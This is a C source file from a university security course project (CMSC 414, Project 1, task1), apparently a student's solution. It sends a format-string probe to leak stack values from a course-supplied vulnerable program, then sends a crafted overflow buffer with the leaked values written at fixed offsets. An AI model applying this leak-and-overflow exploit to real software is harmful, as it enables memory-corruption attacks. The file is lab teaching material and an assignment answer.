/*
 * CMSC 414, Spring 2024
 * Project 1 | task1
 *
 * Build instructions:
 *   We will be building this with the Makefile provided; you may not make
 *   any changes to the Makefile.  You can #include any other standard C
 *   libraries you want in this file, but none that require any compiler
 *   flags that aren't already in the Makefile.
 *
 */

#include <unistd.h>
#include <stdio.h>  // for fwrite()
#include <string.h> // for memset()
#include <stdlib.h> // for EXIT_SUCCESS
#include <stdint.h> // useful

#include "comms.h"  // for communicating with vulnerable

#define BUFFER_SIZE 64

int main()
{

    char buffer[BUFFER_SIZE];
    memset(buffer, 0, BUFFER_SIZE);  // Initialized to all zeroes
    /* TODO: You may change this string */

    char greeting[128] = "%d %d %d";
    char response[512];
    ssize_t resplen;
    resplen = sendto_and_recvfrom_vulnerable(
		    greeting, sizeof(greeting)-1,   /* sent to vulnerable */
		    response, sizeof(response));    /* received from vulnerable */

    /* TODO: Populate the buffer here. Use the 'response' as you see fit */
    char* ptr = &response[22];
    response[10] = '\0';
    response [21] = '\0';
    char* ptr2 = &response[11];
    strcpy(buffer, "hello world hello world hello wd12345678");
    int bob = atoi(ptr);
    int bob2 = atoi(ptr2);
    bob2 = bob2 - 80;
    bob = bob - 64;
    memcpy(&buffer[40], &bob, 4);
    memcpy(&buffer[44], &bob2, 4);
    
    /* Send the buffer (expect no response) */
    sendto_vulnerable(buffer, sizeof(buffer));

    return EXIT_SUCCESS;
}
